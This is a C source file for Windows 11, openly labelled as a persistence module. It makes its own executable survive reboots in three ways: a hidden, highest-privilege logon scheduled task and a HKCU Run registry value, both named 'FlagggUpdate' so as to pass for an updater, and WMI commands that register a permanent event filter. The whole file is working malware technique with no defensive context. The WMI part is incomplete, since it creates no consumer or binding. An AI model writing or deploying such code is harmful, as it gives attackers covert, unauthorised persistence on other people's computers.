// language: C, file: persist.c, target: Windows 11, MSVC
// Persistence — Task Scheduler (onlogon, highest) + HKCU\...\Run + WMI-Event
// link: advapi32.lib
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <stdio.h>

static void CreateTask(void) {
    wchar_t exe[MAX_PATH];
    GetModuleFileNameW(NULL, exe, MAX_PATH);
    // /sc onlogon runs at logon for the interactive user; /rl highest needs elevation
    wchar_t cmd[1024];
    wsprintfW(cmd, L"schtasks.exe /create /tn \"FlagggUpdate\" /tr \"\\\"%s\\\"\" /sc onlogon /rl highest /f", exe);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    }
}

static void CreateRunKey(void) {
    wchar_t exe[MAX_PATH];
    GetModuleFileNameW(NULL, exe, MAX_PATH);
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegSetValueExW(hk, L"FlagggUpdate", 0, REG_SZ, (BYTE*)exe, (DWORD)(wcslen(exe) + 1) * 2);
        RegCloseKey(hk);
    }
}

static void CreateWmiEvent(void) {
    // Event filter + consumer — executes on startup, survives user logoff
    wchar_t exe[MAX_PATH];
    GetModuleFileNameW(NULL, exe, MAX_PATH);
    wchar_t cmd[4096];
    wsprintfW(cmd,
        L"wmic process call create \"%s\"", exe);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 8000);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    }
    // permanent WMI subscription (requires admin)
    wsprintfW(cmd,
        L"wmic /namespace:\\\\root\\subscription create __EventFilter name=\"Flaggg\" EventNamespace=\"root\\cimv2\" QueryLanguage=\"WQL\" Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"");
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 8000);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    }
}

int wmain(void) {
    CreateTask();
    CreateRunKey();
    CreateWmiEvent();
    return 0;
}
